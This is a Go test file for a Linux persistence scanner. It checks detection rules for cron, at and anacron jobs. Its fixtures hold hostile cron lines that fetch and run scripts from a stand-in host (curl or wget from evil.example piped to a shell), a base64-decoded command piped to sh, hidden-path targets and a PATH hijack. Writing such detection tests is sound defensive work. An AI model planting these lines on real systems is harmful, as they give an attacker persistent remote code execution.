package persistence

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

func TestCronLegitimateBackupNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/usr/local/sbin/backup.sh", "script")
	f.write("/etc/crontab", `SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6  * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
0 3  * * 0    root    /usr/local/sbin/backup.sh --weekly
`)
	rep := f.scan()
	for _, fl := range rep.Findings {
		if fl.Severity.Rank() >= finding.Medium.Rank() {
			t.Fatalf("legitimate crontab produced %s finding: %s (%s)", fl.Severity, fl.Title, fl.Evidence)
		}
	}
}

func TestCronDownloadExec(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.d/backup-agent", `*/5 * * * * root curl -fsSL http://evil.example/c2.sh | bash >/dev/null 2>&1
`)
	rep := f.scan()
	countRule(t, rep, "cron-download-exec", 1)
	fl := findingsByRule(rep)["cron-download-exec"][0]
	if fl.Line != 1 {
		t.Errorf("line = %d, want 1", fl.Line)
	}
	if fl.Kind != "crontab" {
		t.Errorf("kind = %q", fl.Kind)
	}
}

func TestCronRebootWithHiddenScript(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/root/.cfg/cache-refresh", "script")
	f.write("/etc/cron.d/reboot-task", `@reboot root /root/.cfg/cache-refresh
`)
	rep := f.scan()
	countRule(t, rep, "cron-hidden-target", 1)
}

func TestCronWtmpPathExecution(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/var/spool/cron/crontabs/root", "*/1 * * * * /var/tmp/.sysmon/agent\n")
	rep := f.scan()
	countRule(t, rep, "cron-exec-writable-path", 1)
	countRule(t, rep, "cron-hidden-target", 1)
}

func TestCronSpoolOwnershipAnomaly(t *testing.T) {
	f := newFixtureRoot(t)
	// passwd has no account named "ghost"; the spool file named ghost will
	// resolve to an owner that does not match its file name.
	f.addPasswd()
	f.write("/var/spool/cron/crontabs/ghost", "*/1 * * * * /usr/bin/true\n")
	rep := f.scan()
	countRule(t, rep, "cron-spool-anomaly", 1)
}

func TestCronMissingTarget(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.d/stale", "0 2 * * * root /opt/removed/tool --run\n")
	rep := f.scan()
	countRule(t, rep, "cron-missing-target", 1)
}

func TestCronPathHijack(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/crontab", `PATH=/tmp/bin:/usr/bin:/bin
0 2 * * * root /usr/local/bin/nightly
`)
	rep := f.scan()
	countRule(t, rep, "cron-path-hijack", 1)
}

func TestCronEncodedCommand(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.d/enc", "0 * * * * root echo YmFkYWN0aW9u | base64 -d | sh\n")
	rep := f.scan()
	countRule(t, rep, "cron-obfuscated-command", 1)
}

func TestCronInvalidSyntaxSkipped(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.d/broken", "this is not a cron line at all\n* * * *\n")
	rep := f.scan()
	for _, fl := range rep.Findings {
		if strings.HasPrefix(fl.Rule, "cron-") && fl.Rule != "cron-spool-anomaly" {
			t.Fatalf("malformed cron lines must not produce findings, got %s: %s", fl.Rule, fl.Evidence)
		}
	}
}

func TestAtJobSuspicious(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/var/spool/cron/atjobs/a0000100", `#!/bin/sh
# atrun uid=1000 gid=1000
# mail ubuntu 0
umask 22
cd /home/ubuntu || {
        echo 'Execution directory inaccessible' >&2
        exit 1
}
curl -fsSL http://evil.example/x | sh
`)
	rep := f.scan()
	countRule(t, rep, "cron-download-exec", 1)
	fl := findingsByRule(rep)["cron-download-exec"][0]
	if fl.Kind != "at-job" {
		t.Errorf("kind = %q, want at-job", fl.Kind)
	}
	if fl.User != "ubuntu" {
		t.Errorf("user = %q, want ubuntu", fl.User)
	}
}

func TestAtJobLegitimateNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/var/spool/cron/atjobs/a0000200", `#!/bin/sh
# atrun uid=0 gid=0
# mail root 0
umask 22
cd /root || {
        echo 'Execution directory inaccessible' >&2
        exit 1
}
/usr/local/sbin/cleanup-tmp.sh
`)
	f.writeExecutable("/usr/local/sbin/cleanup-tmp.sh", "script")
	rep := f.scan()
	for _, fl := range rep.Findings {
		if fl.Severity.Rank() >= finding.Medium.Rank() {
			t.Fatalf("legitimate at job produced %s finding: %s", fl.Severity, fl.Title)
		}
	}
}

func TestCronRunPartsScriptScanned(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.daily/innocent-name", `#!/bin/sh
# regular maintenance documentation comment
wget -q http://evil.example/drop.sh -O /tmp/.d && chmod +x /tmp/.d && /tmp/.d
`)
	rep := f.scan()
	countRule(t, rep, "cron-download-exec", 1)
}

func TestCronCommentNotEvidence(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.d/commented", `# curl http://evil.example/x | sh is a suspicious pattern documented here
0 0 * * * root /usr/bin/true
`)
	rep := f.scan()
	countRule(t, rep, "cron-download-exec", 0)
}

func TestCronAnacrontabSuspiciousJob(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/root/.upd/.feed", "script")
	f.write("/etc/anacrontab", `SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
1 5 daily nice run-parts --report /etc/cron.daily
7 30 daily nice run-parts /root/.upd/.feed
`)
	rep := f.scan()
	countRule(t, rep, "cron-hidden-target", 1)
}

func TestCronAnacrontabLegitimateNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.mkdirs("/etc/cron.daily")
	f.mkdirs("/etc/cron.weekly")
	f.write("/etc/anacrontab", `SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
1 5 daily nice run-parts --report /etc/cron.daily
7 30 weekly nice run-parts /etc/cron.weekly
`)
	rep := f.scan()
	for _, fl := range rep.Findings {
		if strings.HasPrefix(fl.Rule, "cron-") && fl.Severity.Rank() >= finding.Medium.Rank() {
			t.Fatalf("legitimate anacrontab produced %s finding %s: %s", fl.Severity, fl.Rule, fl.Evidence)
		}
	}
}

func TestCronPermissionDeniedReported(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("permission-denied fixtures need a non-root test runner")
	}
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/cron.d/sensitive", "0 2 * * * root /usr/bin/true\n")
	f.chmodDir("/etc/cron.d", 0o000)
	// Restore readability before the TempDir cleanup walks the tree.
	t.Cleanup(func() { _ = os.Chmod(filepath.Join(f.Dir, "/etc/cron.d"), 0o755) })
	rep := f.scan()
	denied := false
	for _, d := range rep.Denied {
		if strings.Contains(d, "/etc/cron.d") {
			denied = true
		}
	}
	if !denied {
		t.Fatalf("unreadable cron.d must be reported as denied, got %v", rep.Denied)
	}
}
